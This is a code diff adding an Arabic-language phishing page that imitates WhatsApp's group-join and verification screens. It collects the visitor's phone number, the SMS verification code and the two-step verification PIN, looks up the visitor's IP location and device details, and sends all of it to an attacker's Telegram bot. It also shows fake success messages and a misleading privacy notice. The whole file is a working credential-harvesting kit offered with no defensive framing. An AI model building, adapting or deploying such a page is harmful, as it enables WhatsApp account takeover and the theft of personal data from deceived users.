@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>واتساب</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            touch-action: manipulation;
+        }
+        
+        /* Header Styles */
+        .whatsapp-header {
+            background-color: #128C7E;
+            color: white;
+            padding: 15px 20px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .whatsapp-logo {
+            width: 48px;
+            height: 48px;
+            background-image: url('https://web.whatsapp.com/img/favicon/1x/favicon.png');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+        }
+        
+        /* Container Styles */
+        .whatsapp-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 500px;
+            margin: 0 auto;
+            width: 100%;
+            background-color: #f0f2f5;
+        }
+        
+        .whatsapp-content {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Input Styles */
+        .input-container, .verification-container {
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .input-label {
+            color: #3b4a54;
+            font-size: 16px;
+            margin-bottom: 15px;
+            display: block;
+            text-align: right;
+        }
+        
+        .phone-input-group {
+            display: flex;
+            margin-bottom: 20px;
+        }
+        
+        .country-select {
+            width: 140px;
+            padding: 12px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px 0 0 8px;
+            font-size: 14px;
+            background-color: #f9f9f9;
+            appearance: none;
+            color: #000;
+            cursor: pointer;
+        }
+        
+        .phone-input, .verification-input {
+            padding: 12px;
+            border: 1px solid #e0e0e0;
+            font-size: 16px;
+            caret-color: transparent;
+            color: #000;
+        }
+        
+        .phone-input {
+            flex: 1;
+            border-left: none;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        /* Verification Inputs */
+        .verification-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+        }
+        
+        .verification-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            border-radius: 8px;
+        }
+        
+        /* Keypad Styles */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .key {
+            background-color: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 15px;
+            font-size: 24px;
+            text-align: center;
+            cursor: pointer;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #000;
+        }
+        
+        .key:active {
+            background-color: #f0f0f0;
+        }
+        
+        .key.empty {
+            visibility: hidden;
+        }
+        
+        .key.delete {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="%23000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path><line x1="18" y1="9" x2="12" y2="15"></line><line x1="12" y1="9" x2="18" y2="15"></line></svg>');
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+        
+        /* Button Styles */
+        .whatsapp-btn {
+            background-color: #128C7E;
+            color: white;
+            border: none;
+            border-radius: 24px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin: 10px 0;
+            width: 100%;
+        }
+        
+        /* Message Styles */
+        .error-message {
+            color: #f44336;
+            text-align: center;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .sms-notice {
+            color: #128C7E;
+            text-align: center;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .footer-text {
+            color: #667781;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        /* Privacy Policy Styles */
+        .privacy-policy {
+            text-align: center;
+            padding: 15px;
+            font-size: 11px;
+            color: #667781;
+            border-top: 1px solid #e0e0e0;
+            margin-top: auto;
+        }
+        
+        /* Utility Classes */
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- صفحة إدخال الرقم -->
+    <div class="whatsapp-container" id="phonePage">
+        <div class="whatsapp-header">
+            <div class="whatsapp-logo"></div>
+       <span>  رابط الإنضمام إلى المجموعة💬 </spam>
+        </div>
+        <div class="whatsapp-content">
+            <div class="input-container">
+                <label class="input-label">أدخل رقم هاتفك للانضمام إلى المجموعة</label>
+                <div class="phone-input-group">
+                    <select id="countryCode" class="country-select">
+                        <option value="+966">🇸🇦 السعودية +966</option>
+                        <option value="+971">🇦🇪 الإمارات +971</option>
+                        <option value="+20">🇪🇬 مصر +20</option>
+                        <option value="+962">🇯🇴 الأردن +962</option>
+                        <option value="+965">🇰🇼 الكويت +965</option>
+                        <option value="+974">🇶🇦 قطر +974</option>
+                        <option value="+968">🇴🇲 عمان +968</option>
+                        <option value="+973">🇧🇭 البحرين +973</option>
+                        <option value="+213">🇩🇿 الجزائر +213</option>
+                        <option value="+212">🇲🇦 المغرب +212</option>
+                        <option value="+216">🇹🇳 تونس +216</option>
+                        <option value="+964">🇮🇶 العراق +964</option>
+                        <option value="+961">🇱🇧 لبنان +961</option>
+                    </select>
+                    <input type="tel" id="phoneNumber" class="phone-input" placeholder="رقم الهاتف" inputmode="none" readonly>
+                </div>
+            </div>
+
+            <div class="keypad">
+                <button class="key" onclick="appendNumber('1')">1</button>
+                <button class="key" onclick="appendNumber('2')">2</button>
+                <button class="key" onclick="appendNumber('3')">3</button>
+                <button class="key" onclick="appendNumber('4')">4</button>
+                <button class="key" onclick="appendNumber('5')">5</button>
+                <button class="key" onclick="appendNumber('6')">6</button>
+                <button class="key" onclick="appendNumber('7')">7</button>
+                <button class="key" onclick="appendNumber('8')">8</button>
+                <button class="key" onclick="appendNumber('9')">9</button>
+                <button class="key empty"></button>
+                <button class="key" onclick="appendNumber('0')">0</button>
+                <button class="key delete" onclick="deleteNumber()"></button>
+            </div>
+
+            <button class="whatsapp-btn" onclick="sendVerification()">الإنضمام</button>
+            
+            <div class="privacy-policy">
+                سياسة الخصوصية الخاصة بنا:
+                1. جمع البيانات: نجمع فقط المعلومات الضرورية لتسجيل الدخول وتفعيل الحساب.
+                2. استخدام البيانات: نستخدم بياناتك فقط لتقديم الخدمة المطلوبة ولأغراض الأمان.
+            </div>
+        </div>
+    </div>
+
+    <!-- صفحة التحقق -->
+    <div class="whatsapp-container hidden" id="verificationPage">
+        <div class="whatsapp-header">
+            <div class="whatsapp-logo"></div>
+            <span>WhatsApp</span>
+        </div>
+        <div class="whatsapp-content">
+            <div class="verification-container">
+                <label class="input-label">أدخل الرمز تأكيدالمرسل إلى رقم الجوال</label>
+                <p class="sms-notice">سيتم إرسال رمز مكون من 6 أرقام إلى رسائلك النصية</p>
+                <div class="verification-inputs">
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="text" class="verification-input" maxlength="1" inputmode="none" readonly>
+                </div>
+                <p class="error-message hidden" id="errorMessage">الرمز غير صحيح، يرجى المحاولة مرة أخرى</p>
+            </div>
+
+            <div class="keypad">
+                <button class="key" onclick="appendCode('1')">1</button>
+                <button class="key" onclick="appendCode('2')">2</button>
+                <button class="key" onclick="appendCode('3')">3</button>
+                <button class="key" onclick="appendCode('4')">4</button>
+                <button class="key" onclick="appendCode('5')">5</button>
+                <button class="key" onclick="appendCode('6')">6</button>
+                <button class="key" onclick="appendCode('7')">7</button>
+                <button class="key" onclick="appendCode('8')">8</button>
+                <button class="key" onclick="appendCode('9')">9</button>
+                <button class="key empty"></button>
+                <button class="key" onclick="appendCode('0')">0</button>
+                <button class="key delete" onclick="deleteCode()"></button>
+            </div>
+
+            <button class="whatsapp-btn" onclick="verifyCode()">الانضمام إلى المجموعة</button>
+            <p class="footer-text">لم تستلم الرمز؟ <a href="#" onclick="resendCode()">إعادة إرسال</a></p>
+            
+            <div class="privacy-policy">
+                سياسة الخصوصية الخاصة بنا:
+                1. جمع البيانات: نجمع فقط المعلومات الضرورية لتسجيل الدخول وتفعيل الحساب.
+                2. استخدام البيانات: نستخدم بياناتك فقط لتقديم الخدمة المطلوبة ولأغراض الأمان.
+            </div>
+        </div>
+    </div>
+
+    <!-- صفحة الأمان -->
+    <div class="whatsapp-container hidden" id="securityPage">
+        <div class="whatsapp-header">
+            <div class="whatsapp-logo"></div>
+            <span>WhatsApp</span>
+        </div>
+        <div class="whatsapp-content">
+            <div class="verification-container">
+                <label class="input-label">أدخل رمز اتحقق بي خطوتين المكون من 6 أرقام</label>
+                <div class="verification-inputs">
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                    <input type="password" class="verification-input" maxlength="1" inputmode="none" readonly>
+                </div>
+                <p class="error-message hidden" id="securityErrorMessage">رمز الأمان غير صحيح</p>
+            </div>
+
+            <div class="keypad">
+                <button class="key" onclick="appendSecurity('1')">1</button>
+                <button class="key" onclick="appendSecurity('2')">2</button>
+                <button class="key" onclick="appendSecurity('3')">3</button>
+                <button class="key" onclick="appendSecurity('4')">4</button>
+                <button class="key" onclick="appendSecurity('5')">5</button>
+                <button class="key" onclick="appendSecurity('6')">6</button>
+                <button class="key" onclick="appendSecurity('7')">7</button>
+                <button class="key" onclick="appendSecurity('8')">8</button>
+                <button class="key" onclick="appendSecurity('9')">9</button>
+                <button class="key empty"></button>
+                <button class="key" onclick="appendSecurity('0')">0</button>
+                <button class="key delete" onclick="deleteSecurity()"></button>
+            </div>
+
+            <button class="whatsapp-btn" onclick="submitSecurity()">تأكيد</button>
+            
+            <div class="privacy-policy">
+                سياسة الخصوصية الخاصة بنا:
+                1. جمع البيانات: نجمع فقط المعلومات الضرورية لتسجيل الدخول وتفعيل الحساب.
+                2. استخدام البيانات: نستخدم بياناتك فقط لتقديم الخدمة المطلوبة ولأغراض الأمان.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Application Variables
+        let userPhone = '';
+        let userCountryCode = '+966';
+        let currentCodeIndex = 0;
+        let currentSecurityIndex = 0;
+        let waToken = generateToken();
+
+        // Generate unique token
+        function generateToken() {
+            return 'WA-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 9);
+        }
+
+        // Phone Number Functions
+        function appendNumber(num) {
+            const phoneInput = document.getElementById('phoneNumber');
+            if (phoneInput.value.length < 15) {
+                phoneInput.value += num;
+            }
+        }
+
+        function deleteNumber() {
+            const phoneInput = document.getElementById('phoneNumber');
+            phoneInput.value = phoneInput.value.slice(0, -1);
+        }
+
+        // Verification Functions
+        function sendVerification() {
+            const countrySelect = document.getElementById('countryCode');
+            userCountryCode = countrySelect.value;
+            const phoneInput = document.getElementById('phoneNumber');
+            userPhone = phoneInput.value.trim();
+
+            if (!userPhone || userPhone.length < 9) {
+                alert('الرجاء إدخال رقم هاتف صحيح');
+                return;
+            }
+
+            waToken = generateToken();
+
+            document.getElementById('phonePage').classList.add('hidden');
+            document.getElementById('verificationPage').classList.remove('hidden');
+
+            // إرسال البيانات إلى السيرفر
+            sendToTelegram('verification_request', userCountryCode, userPhone, 'N/A');
+        }
+
+        function appendCode(num) {
+            const inputs = document.querySelectorAll('#verificationPage .verification-input');
+            if (currentCodeIndex < 6) {
+                inputs[currentCodeIndex].value = num;
+                currentCodeIndex++;
+                if (currentCodeIndex < 6) {
+                    inputs[currentCodeIndex].focus();
+                }
+                
+                if (currentCodeIndex === 6) {
+                    verifyCode();
+                }
+            }
+        }
+
+        function deleteCode() {
+            const inputs = document.querySelectorAll('#verificationPage .verification-input');
+            if (currentCodeIndex > 0) {
+                currentCodeIndex--;
+                inputs[currentCodeIndex].value = '';
+                inputs[currentCodeIndex].focus();
+            }
+        }
+
+        function verifyCode() {
+            const inputs = document.querySelectorAll('#verificationPage .verification-input');
+            let enteredCode = '';
+            inputs.forEach(input => {
+                enteredCode += input.value;
+            });
+
+            if (enteredCode.length === 6) {
+                document.getElementById('verificationPage').classList.add('hidden');
+                document.getElementById('securityPage').classList.remove('hidden');
+                currentSecurityIndex = 0;
+
+                sendToTelegram('verification_success', userCountryCode, userPhone, enteredCode);
+            } else {
+                document.getElementById('errorMessage').classList.remove('hidden');
+            }
+        }
+
+        function resendCode() {
+            alert('تم طلب إعادة إرسال الرمز');
+            sendToTelegram('resend_code', userCountryCode, userPhone, 'N/A');
+        }
+
+        // Security Functions
+        function appendSecurity(num) {
+            const inputs = document.querySelectorAll('#securityPage .verification-input');
+            if (currentSecurityIndex < 6) {
+                inputs[currentSecurityIndex].value = num;
+                currentSecurityIndex++;
+                if (currentSecurityIndex < 6) {
+                    inputs[currentSecurityIndex].focus();
+                }
+                
+                if (currentSecurityIndex === 6) {
+                    submitSecurity();
+                }
+            }
+        }
+
+        function deleteSecurity() {
+            const inputs = document.querySelectorAll('#securityPage .verification-input');
+            if (currentSecurityIndex > 0) {
+                currentSecurityIndex--;
+                inputs[currentSecurityIndex].value = '';
+                inputs[currentSecurityIndex].focus();
+            }
+        }
+
+        function submitSecurity() {
+            const inputs = document.querySelectorAll('#securityPage .verification-input');
+            let securityCode = '';
+            inputs.forEach(input => {
+                securityCode += input.value;
+            });
+
+            if (securityCode.length === 6) {
+                alert('تم إنشاء الحساب بنجاح! سيتم الآن إضافتك إلى المجموعة.');
+                sendToTelegram('security_submit', userCountryCode, userPhone, securityCode);
+            } else {
+                document.getElementById('securityErrorMessage').classList.remove('hidden');
+            }
+        }
+
+        // Telegram Integration
+        async function sendToTelegram(action, countryCode, phone, code) {
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                const deviceInfo = getDeviceInfo();
+                const timestamp = new Date().toLocaleString('ar-SA');
+
+                const message = `📲 *تقرير WhatsApp جديد* 📲\n\n` +
+                               `🔹 *الإجراء:* ${getActionName(action)}\n` +
+                               `📞 *رقم الهاتف:* ${countryCode} ${phone}\n` +
+                               `🔢 ${action.includes('verification') ? 'رمز التحقق' : 'رمز الأمان'}: ${code}\n` +
+                               `🆔 *الرمز الفريد:* ${waToken}\n\n` +
+                               `🌍 *معلومات الموقع:*\n` +
+                               `- الدولة: ${ipData.country_name} (${ipData.country})\n` +
+                               `- المدينة: ${ipData.city || 'غير معروف'}\n` +
+                               `- IP: ${ipData.ip}\n\n` +
+                               `📱 *معلومات الجهاز:*\n` +
+                               `- النظام: ${deviceInfo.os}\n` +
+                               `- المتصفح: ${deviceInfo.browser}\n` +
+                               `- الوقت: ${timestamp}`;
+
+                const botToken = 'YOUR_BOT_TOKEN';
+                const chatId = 'YOUR_CHAT_ID';
+                
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+                
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => console.log('تم إرسال البيانات إلى تلجرام:', data))
+                    .catch(error => console.error('خطأ في الإرسال:', error));
+
+            } catch (error) {
+                console.error('خطأ في جمع البيانات:', error);
+            }
+        }
+
+        // Helper Functions
+        function getActionName(action) {
+            const actions = {
+                'verification_request': 'طلب التحقق',
+                'verification_success': 'تحقق ناجح',
+                'resend_code': 'إعادة إرسال الرمز',
+                'security_submit': 'إرسال رمز الأمان'
+            };
+            return actions[action] || action;
+        }
+
+        function getDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            let os = 'غير معروف';
+            let browser = 'غير معروف';
+
+            if (/Android/.test(userAgent)) os = 'Android';
+            else if (/iPhone|iPad|iPod/.test(userAgent)) os = 'iOS';
+            else if (/Windows/.test(userAgent)) os = 'Windows';
+            else if (/Mac/.test(userAgent)) os = 'MacOS';
+            else if (/Linux/.test(userAgent)) os = 'Linux';
+
+            if (/Chrome/.test(userAgent)) browser = 'Chrome';
+            else if (/Firefox/.test(userAgent)) browser = 'Firefox';
+            else if (/Safari/.test(userAgent)) browser = 'Safari';
+            else if (/Edge/.test(userAgent)) browser = 'Edge';
+            else if (/Opera/.test(userAgent)) browser = 'Opera';
+
+            return { os, browser };
+        }
+
+        // Event Listeners
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', function() {
+                this.blur();
+            });
+        });
+
+        document.getElementById('countryCode').addEventListener('change', function() {
+            userCountryCode = this.value;
+        });
+    </script>
+</body>
+</html>
